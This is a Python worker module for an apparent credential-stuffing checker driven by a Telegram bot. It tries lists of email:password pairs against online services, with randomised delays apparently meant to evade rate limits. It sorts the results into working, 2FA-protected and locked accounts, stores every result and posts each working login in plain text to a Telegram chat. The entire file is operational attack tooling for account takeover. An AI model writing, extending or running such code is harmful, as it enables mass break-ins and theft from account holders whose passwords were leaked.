# language: Python 3.11 — core/worker.py
import asyncio
import random

from services import SERVICES
from services.base import Status
from db import store_hit
from config import RATE

ICONS = {"HIT": "✅", "2FA": "🔐", "LOCKED": "⚠️"}
HIT_STATUSES = {"HIT", "2FA", "LOCKED"}


class BatchRun:
    def __init__(self, bot, chat_id, service, pairs, progress_msg, interval=25):
        self.bot = bot
        self.chat_id = chat_id
        self.service = service
        self.pairs = pairs
        self.progress_msg = progress_msg
        self.interval = interval
        self.done = 0
        self.hits = 0
        self.counts = {s: 0 for s in ("HIT", "2FA", "LOCKED", "INVALID", "ERROR")}

    def _bar(self) -> str:
        pct = int(self.done * 100 / len(self.pairs)) if self.pairs else 0
        filled = pct // 10
        return "█" * filled + "░" * (10 - filled)

    async def _progress(self):
        text = (
            f"<b>{self.service}</b> · checking\n"
            f"<code>{self._bar()}</code> {self.done}/{len(self.pairs)} · hits <b>{self.hits}</b>"
        )
        try:
            await self.progress_msg.edit_text(text)
        except Exception:
            pass

    async def _fire_hit(self, email: str, pw: str, status: str, detail: str):
        icon = ICONS.get(status, "•")
        try:
            await self.bot.send_message(
                self.chat_id,
                f"{icon} <b>{status}</b> · <code>{self.service}</code>\n"
                f"<code>{email}:{pw}</code>\n"
                f"<i>{detail}</i>",
            )
        except Exception:
            pass

    async def run(self, session):
        svc = SERVICES[self.service]
        for email, pw in self.pairs:
            await asyncio.sleep(RATE + random.random() * RATE)
            res = await svc.check(session, email, pw)
            self.done += 1
            self.counts[res.status] = self.counts.get(res.status, 0) + 1
            await store_hit(self.service, email, pw, res.status.value, res.detail)

            if res.status.value in HIT_STATUSES:
                self.hits += 1
                await self._fire_hit(email, pw, res.status.value, res.detail)

            if self.done % self.interval == 0 or self.done == len(self.pairs):
                await self._progress()

        await self._progress()
        return self.counts
